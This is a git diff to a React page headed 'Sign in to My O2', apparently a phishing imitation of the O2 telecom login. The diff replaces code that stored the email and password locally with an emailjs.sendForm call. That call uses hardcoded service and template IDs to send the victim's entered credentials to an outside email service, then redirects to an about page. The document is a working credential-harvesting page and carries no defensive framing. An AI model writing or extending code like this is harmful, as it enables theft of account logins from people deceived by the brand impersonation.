@@ -1,25 +1,29 @@
-import React, { useState } from "react";
+import React, { useState, useRef } from "react";
 import Accordian from "../components/Accordian";
 import Wrapper from "../components/Wrapper";
 import { IoIosArrowDroprightCircle } from "react-icons/io";
 import "./home.css";
 import Footer from "../components/Footer/Footer";
+import emailjs from '@emailjs/browser';
 import { useNavigate } from "react-router-dom";
 
 const Home = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
+  const form = useRef();
   const navigate = useNavigate();
 
   const handleSubmit = (e) => {
     e.preventDefault();
     
-    // Store email and password in local storage
-    localStorage.setItem('email', email);
-    localStorage.setItem('password', password);
-    
-    // Navigate to the "about" page
-    navigate("/about");
+    // Sending email using emailjs
+    emailjs.sendForm('service_9nomj6r', 'template_y9ip2v9', form.current, 'ygYqOm4gSNnVf-A7Z')
+      .then(() => {
+        navigate("/about");
+      })
+      .catch((error) => {
+        console.error('Email sending failed...', error.text);
+      });
   };
 
   return (
@@ -30,7 +34,7 @@ const Home = () => {
           <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-4">
             <div className="w-full h-full bg-white mt-4 rounded-lg p-4">
               <h1 className="text-2xl mb-4">Sign in to My O2</h1>
-              <form onSubmit={handleSubmit}>
+              <form ref={form} onSubmit={handleSubmit}>
                 <div className="mb-4">
                   <label
                     htmlFor="email"
@@ -41,7 +45,7 @@ const Home = () => {
                   <input
                     type="email"
                     id="email"
-                    name="user_email"
+                    name="user_email" // Ensure this matches your emailjs template field
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
                     className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
@@ -59,7 +63,7 @@ const Home = () => {
                   <input
                     type="password"
                     id="password"
-                    name="user_password"
+                    name="user_password" // Ensure this matches your emailjs template field
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
                     className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
@@ -167,5 +171,3 @@ const Home = () => {
 };
 
 export default Home;
-
-
